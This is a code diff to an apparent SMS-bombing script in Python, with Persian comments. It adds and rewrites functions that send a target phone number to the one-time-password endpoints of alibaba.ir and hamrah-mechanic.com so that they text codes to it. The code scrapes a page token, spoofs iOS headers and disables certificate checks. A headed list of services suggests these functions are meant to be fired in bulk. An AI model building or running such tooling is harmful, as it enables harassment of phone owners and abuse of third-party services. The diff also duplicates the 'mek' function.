@@ -66,61 +66,113 @@ def send_service_safe(service, phone):
 
 
 
-def mek(phone):
-    formatted_phone = "+98" + re.sub(r'[^0-9]', '', phone.replace("+98", ""))[1:]
+def alibaba(phone):
     try:
-        url = 'https://www.hamrah-mechanic.com/api/v1/membership/otp'
-        data = {
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        payload = {"phoneNumber": formatted_phone}
+        
+        response = requests.post(
+            'https://ws.alibaba.ir/api/v3/account/mobile/otp', 
+            json=payload,
+            timeout=10,
+            verify=False
+        )
+        
+        if response.status_code == 200:
+            data = response.json()
+            if data.get("result", {}).get("success"):
+                print(f'{g}(alibaba) code sent{a}')
+                return True
+        print(f'{r}[-] alibaba error: {response.status_code}{a}')
+        return False
+        
+    except Exception as e:
+        print(f"{r}[!] alibaba exception: {e}{a}")
+        return False
+
+def mek(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        payload = {"phoneNumber": formatted_phone}
+        
+        response = requests.post(
+            'https://www.hamrah-mechanic.com/api/v1/auth/login',
+            data=payload,
+            timeout=10,
+            verify=False
+        )
+        
+        if response.status_code == 200:
+            data = response.json()
+            if data.get('isSuccess'):
+                print(f'{g}(mek) code sent{a}')
+                return True
+        print(f'{r}[-] mek error: {response.status_code}{a}')
+        return False
+        
+    except Exception as e:
+        print(f"{r}[!] mek exception: {e}{a}")
+        return False
+
+def mek(phone):
+    try:
+        session = requests.Session()
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+
+        # دریافت صفحه اصلی
+        main_url = "https://www.hamrah-mechanic.com/membersignin/"
+        resp = session.get(main_url, timeout=10)
+        resp.encoding = 'utf-8'
+
+        # استخراج توکن‌ها
+        token_match = re.search(r'X-Meta-Token["\']?\s*:\s*["\'](\d+)', resp.text)
+        x_meta_token = token_match.group(1) if token_match else "413341"
+
+        # آماده‌سازی payload
+        payload = {
             "PhoneNumber": formatted_phone,
             "prevDomainUrl": None,
-            "landingPageUrl": "https://www.hamrah-mechanic.com/carprice/saipa/zamyadpickup/type-2543/",
+            "landingPageUrl": "https://www.hamrah-mechanic.com/carprice/",
             "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
             "prevUrl": "https://www.hamrah-mechanic.com/profile/",
             "referrer": None
         }
-        headers = {"Accept": "application/json", "Content-Type": "application/json"}
-        r = requests.post(url, json=data, headers=headers, timeout=10, verify=False)
-        if r.status_code == 200:
-            print(f"{g}[+] mek: Code Sent!{a}")
+
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "env": "prd",
+            "Source": "ios",
+            "X-Meta-Token": x_meta_token,
+            "_uti": str(uuid.uuid4())
+        }
+
+        # ارسال درخواست
+        response = session.post(
+            "https://www.hamrah-mechanic.com/api/v1/membership/otp",
+            json=payload, 
+            headers=headers, 
+            timeout=10, 
+            verify=False
+        )
+
+        if response.status_code == 200:
+            print(f'{g}(mek) sms sent successfully!{a}')
             return True
         else:
-            print(f"{r}[-] mek Error: {r.status_code}{a}")
+            print(f'{r}[-] mek error: {response.status_code}{a}')
             return False
+
     except Exception as e:
-        print(f"{r}[!] mek Exception: {e}{a}")
+        print(f'{r}[!] mek exception: {e}{a}')
         return False
 
 
-def format_phone(phone: str):
-    """تبدیل شماره به فرمت بدون صفر اول برای Alibaba"""
-    digits = re.sub(r'[^0-9]', '', phone)
-    return digits[1:] if digits.startswith("0") else digits
-
-def alibaba(phone):
-    phone_number = format_phone(phone)
-    payload = {"phoneNumber": phone_number}
-    headers = {
-        "Accept": "application/json",
-        "Content-Type": "application/json",
-        "ab-channel": "WEB-NEW",
-        "tracing-sessionid": "ab-alohomora",
-        "tracing-device": "mobile, Mobile Safari, 18.6, iPhone, Apple, iOS, 18.6",
-        "User-Agent": random.choice(user_agents)
-    }
-    try:
-        print(f"[Alibaba] Payload: {payload}")
-        print(f"[Alibaba] Headers: {headers}")
-        r = requests.post("https://ws.alibaba.ir/api/v3/account/mobile/otp", json=payload, headers=headers, timeout=10)
-        if r.status_code == 200:
-            print(f"{g}[Alibaba] Code Sent Successfully!{a}")
-            return True
-        else:
-            print(f"{r}[-] Alibaba HTTP Error: {r.status_code}{a}")
-            return False
-    except Exception as e:
-        print(f"{r}[!] Alibaba Exception: {e}{a}")
-
-      
 
 # ==========================
 # لیست سرویس‌ها
